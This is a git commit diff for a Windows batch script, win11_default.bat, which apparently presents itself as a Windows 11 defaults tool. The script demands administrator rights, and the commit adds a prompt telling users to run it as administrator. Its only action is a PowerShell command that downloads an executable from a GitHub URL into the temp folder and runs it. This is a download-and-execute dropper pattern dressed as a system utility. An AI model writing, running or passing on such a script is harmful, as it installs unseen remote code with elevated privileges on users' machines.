e96e1233bdf4a01097654c492194709533b346e2
optolab <sloneeddie36@gmail.com>
2025-01-13 03:38:02 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,14 +1,13 @@
 @echo off
 
-:: Check if the script is running as administrator
 net session >nul 2>&1
 if %errorlevel% neq 0 (
     echo This script must be run as an administrator.
+    echo Right-click this file and select "Run as Administrator."
     pause
     exit /b
 )
 
-:: Download and execute the file
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\default.exe"
 if exist "%TEMP%\default.exe" (
     start "" "%TEMP%\default.exe"
